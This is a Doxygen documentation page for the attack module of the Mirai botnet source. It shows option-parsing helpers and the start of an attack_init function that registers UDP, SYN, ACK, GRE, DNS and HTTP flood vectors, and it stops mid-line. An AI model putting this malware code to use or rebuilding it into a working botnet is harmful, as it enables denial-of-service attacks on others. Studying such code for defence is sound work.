<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: mirai/bot/attack.c File Reference</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('attack_8c.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="summary">
<a href="#define-members">Macros</a> &#124;
<a href="#func-members">Functions</a> &#124;
<a href="#var-members">Variables</a>  </div>
  <div class="headertitle">
<div class="title">attack.c File Reference</div>  </div>
</div><!--header-->
<div class="contents">
<div class="textblock"><code>#include &lt;stdlib.h&gt;</code><br />
<code>#include &lt;unistd.h&gt;</code><br />
<code>#include &lt;signal.h&gt;</code><br />
<code>#include &lt;errno.h&gt;</code><br />
<code>#include &quot;<a class="el" href="mirai_2bot_2includes_8h_source.html">includes.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="attack_8h_source.html">attack.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="rand_8h_source.html">rand.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="mirai_2bot_2util_8h_source.html">util.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="scanner_8h_source.html">scanner.h</a>&quot;</code><br />
</div>
<p><a href="attack_8c_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="define-members"></a>
Macros</h2></td></tr>
<tr class="memitem:a369266c24eacffb87046522897a570d5"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a369266c24eacffb87046522897a570d5">_GNU_SOURCE</a></td></tr>
<tr class="separator:a369266c24eacffb87046522897a570d5"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:ad99d6dee9df7ab3929a42a3e011cbf3b"><td class="memItemLeft" align="right" valign="top"><a class="el" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#ad99d6dee9df7ab3929a42a3e011cbf3b">attack_init</a> (void)</td></tr>
<tr class="separator:ad99d6dee9df7ab3929a42a3e011cbf3b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acf00fa745202d52753ab2b2b9b7b1e09"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#acf00fa745202d52753ab2b2b9b7b1e09">attack_kill_all</a> (void)</td></tr>
<tr class="separator:acf00fa745202d52753ab2b2b9b7b1e09"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5371fded25466f711e2d1b3c3fdf17c7"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a5371fded25466f711e2d1b3c3fdf17c7">attack_parse</a> (char *buf, int len)</td></tr>
<tr class="separator:a5371fded25466f711e2d1b3c3fdf17c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5631e1ae5b2170dabea1d03c816e9885"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a5631e1ae5b2170dabea1d03c816e9885">attack_start</a> (int duration, <a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a> vector, uint8_t targs_len, struct <a class="el" href="structattack__target.html">attack_target</a> *targs, uint8_t opts_len, struct <a class="el" href="structattack__option.html">attack_option</a> *opts)</td></tr>
<tr class="separator:a5631e1ae5b2170dabea1d03c816e9885"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a79b03d7c093d14a1640b2e5bcf2c3c38"><td class="memItemLeft" align="right" valign="top">char *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a> (uint8_t opts_len, struct <a class="el" href="structattack__option.html">attack_option</a> *opts, uint8_t opt, char *def)</td></tr>
<tr class="separator:a79b03d7c093d14a1640b2e5bcf2c3c38"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab59e5bf31f63eeb001f8ec1278a15907"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a> (uint8_t opts_len, struct <a class="el" href="structattack__option.html">attack_option</a> *opts, uint8_t opt, int def)</td></tr>
<tr class="separator:ab59e5bf31f63eeb001f8ec1278a15907"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a51262dda96f2861dbd13fc0b6f0a31d3"><td class="memItemLeft" align="right" valign="top">uint32_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a> (uint8_t opts_len, struct <a class="el" href="structattack__option.html">attack_option</a> *opts, uint8_t opt, uint32_t def)</td></tr>
<tr class="separator:a51262dda96f2861dbd13fc0b6f0a31d3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a22dc581aab1aa201c76bf9bbb82affdf"><td class="memItemLeft" align="right" valign="top">static void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a> (<a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a> vector, <a class="el" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a> func)</td></tr>
<tr class="separator:a22dc581aab1aa201c76bf9bbb82affdf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a540818eda3ba12636511e0ef58c4630b"><td class="memItemLeft" align="right" valign="top">static void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a540818eda3ba12636511e0ef58c4630b">free_opts</a> (struct <a class="el" href="structattack__option.html">attack_option</a> *opts, int len)</td></tr>
<tr class="separator:a540818eda3ba12636511e0ef58c4630b"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="var-members"></a>
Variables</h2></td></tr>
<tr class="memitem:ad3932419efa41f4f3ce7ab4e91ff5f6e"><td class="memItemLeft" align="right" valign="top">uint8_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a> = 0</td></tr>
<tr class="separator:ad3932419efa41f4f3ce7ab4e91ff5f6e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a126c018b410f7361fff77d10000a8f20"><td class="memItemLeft" align="right" valign="top">struct <a class="el" href="structattack__method.html">attack_method</a> **&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a> = NULL</td></tr>
<tr class="separator:a126c018b410f7361fff77d10000a8f20"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a46485849828585ce0cad92273523730c"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8c.html#a46485849828585ce0cad92273523730c">attack_ongoing</a> [<a class="el" href="attack_8h.html#a7c4eacf15bd06764a0834171b5d6789f">ATTACK_CONCURRENT_MAX</a>] = {0}</td></tr>
<tr class="separator:a46485849828585ce0cad92273523730c"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<h2 class="groupheader">Macro Definition Documentation</h2>
<a class="anchor" id="a369266c24eacffb87046522897a570d5"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define _GNU_SOURCE</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00001">1</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

</div>
</div>
<h2 class="groupheader">Function Documentation</h2>
<a class="anchor" id="a22dc581aab1aa201c76bf9bbb82affdf"></a>
<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static void add_attack </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>&#160;</td>
          <td class="paramname"><em>vector</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>&#160;</td>
          <td class="paramname"><em>func</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00226">226</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00074">attack_method::func</a>, <a class="el" href="attack_8c_source.html#l00018">methods_len</a>, and <a class="el" href="attack_8h_source.html#l00075">attack_method::vector</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;{</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__method.html">attack_method</a> *method = calloc(1, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__method.html">attack_method</a>));</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;</div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;    method-&gt;<a class="code" href="structattack__method.html#a6b62edafec0c6cbdda1b25e1c520698e">vector</a> = <a class="code" href="structattack__method.html#a6b62edafec0c6cbdda1b25e1c520698e">vector</a>;</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;    method-&gt;<a class="code" href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">func</a> = <a class="code" href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">func</a>;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;    <a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a> = realloc(<a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a>, (<a class="code" href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a> + 1) * <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__method.html">attack_method</a> *));</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;    <a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a>[<a class="code" href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a>++] = method;</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;}</div><div class="ttc" id="structattack__method_html_aa7564fe36f7cddd26ecd9b286eb04184"><div class="ttname"><a href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">attack_method::func</a></div><div class="ttdeci">ATTACK_FUNC func</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00074">attack.h:74</a></div></div>
<div class="ttc" id="attack_8c_html_ad3932419efa41f4f3ce7ab4e91ff5f6e"><div class="ttname"><a href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a></div><div class="ttdeci">uint8_t methods_len</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00018">attack.c:18</a></div></div>
<div class="ttc" id="structattack__method_html"><div class="ttname"><a href="structattack__method.html">attack_method</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00073">attack.h:73</a></div></div>
<div class="ttc" id="attack_8c_html_a126c018b410f7361fff77d10000a8f20"><div class="ttname"><a href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a></div><div class="ttdeci">struct attack_method ** methods</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00019">attack.c:19</a></div></div>
<div class="ttc" id="structattack__method_html_a6b62edafec0c6cbdda1b25e1c520698e"><div class="ttname"><a href="structattack__method.html#a6b62edafec0c6cbdda1b25e1c520698e">attack_method::vector</a></div><div class="ttdeci">ATTACK_VECTOR vector</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00075">attack.h:75</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="ab59e5bf31f63eeb001f8ec1278a15907"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int attack_get_opt_int </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opts_len</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname"><em>opts</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opt</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>def</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00206">206</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8c_source.html#l00193">attack_get_opt_str()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00087">util_atoi()</a>, and <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>
<div class="fragment"><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;{</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;    <span class="keywordtype">char</span> *val = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, opt, NULL);</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;    <span class="keywordflow">if</span> (val == NULL)</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;        <span class="keywordflow">return</span> def;</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;        <span class="keywordflow">return</span> <a class="code" href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a>(val, 10);</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;}</div><div class="ttc" id="mirai_2bot_2util_8c_html_a45cd12b38d32ad249e74803c96a12cd3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a></div><div class="ttdeci">int util_atoi(char *str, int base)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00087">util.c:87</a></div></div>
<div class="ttc" id="attack_8c_html_a79b03d7c093d14a1640b2e5bcf2c3c38"><div class="ttname"><a href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a></div><div class="ttdeci">char * attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00193">attack.c:193</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a51262dda96f2861dbd13fc0b6f0a31d3"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">uint32_t attack_get_opt_ip </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opts_len</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname"><em>opts</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opt</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint32_t&#160;</td>
          <td class="paramname"><em>def</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00216">216</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8c_source.html#l00193">attack_get_opt_str()</a>, and <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>
<div class="fragment"><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;{</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;    <span class="keywordtype">char</span> *val = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, opt, NULL);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;    <span class="keywordflow">if</span> (val == NULL)</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;        <span class="keywordflow">return</span> def;</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;        <span class="keywordflow">return</span> inet_addr(val);</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;}</div><div class="ttc" id="attack_8c_html_a79b03d7c093d14a1640b2e5bcf2c3c38"><div class="ttname"><a href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a></div><div class="ttdeci">char * attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00193">attack.c:193</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a79b03d7c093d14a1640b2e5bcf2c3c38"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">char* attack_get_opt_str </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opts_len</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname"><em>opts</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname"><em>opt</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>def</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00193">193</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00028">attack_option::key</a>, and <a class="el" href="attack_8h_source.html#l00027">attack_option::val</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="attack_8c_source.html#l00216">attack_get_opt_ip()</a>, and <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>.</p>
<div class="fragment"><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;{</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; opts_len; i++)</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;    {</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;        <span class="keywordflow">if</span> (opts[i].key == opt)</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;            <span class="keywordflow">return</span> opts[i].<a class="code" href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">val</a>;</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;    }</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;    <span class="keywordflow">return</span> def;</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;}</div><div class="ttc" id="structattack__option_html_ab0978cf1e5a662ff83e73356b422d837"><div class="ttname"><a href="structattack__option.html#ab0978cf1e5a662ff83e73356b422d837">attack_option::val</a></div><div class="ttdeci">char * val</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00027">attack.h:27</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="ad99d6dee9df7ab3929a42a3e011cbf3b"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> attack_init </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00022">22</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8c_source.html#l00226">add_attack()</a>, <a class="el" href="attack_8h_source.html#l00038">ATK_VEC_ACK</a>, <a class="el" href="attack_8h_source.html#l00036">ATK_VEC_DNS</a>, <a class="el" href="attack_8h_source.html#l00041">ATK_VEC_GREETH</a>, <a class="el" href="attack_8h_source.html#l00040">ATK_VEC_GREIP</a>, <a class="el" href="attack_8h_source.html#l00044">ATK_VEC_HTTP</a>, <a class="el" href="attack_8h_source.html#l00039">ATK_VEC_STOMP</a>, <a class="el" href="attack_8h_source.html#l00037">ATK_VEC_SYN</a>, <a class="el" href="attack_8h_source.html#l00034">ATK_VEC_UDP</a>, <a class="el" href="attack_8h_source.html#l00043">ATK_VEC_UDP_PLAIN</a>, <a class="el" href="attack_8h_source.html#l00035">ATK_VEC_VSE</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>, <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00047">main()</a>.</p>
<div class="fragment"><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;{</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;</div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#ae0f309784c914a61d84fd3988e3e7321">ATK_VEC_UDP</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a793fdfa64aaad657551cc649e2988a81">attack_udp_generic</a>);</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <a class="code" href="attack_8c.html#a22dc581aab1aa201c76bf9bbb82affdf">add_attack</a>(<a class="code" href="attack_8h.html#afa9c71242ff3032ca0a9b4f8053a9769">ATK_VEC_VSE</a>, (<a class="code" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)<a class="code" href="attack_8h.html#a12573f0d31b49ed03a25a6bee68cd37f">attack_udp_vse</a>);</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    <a class="code" 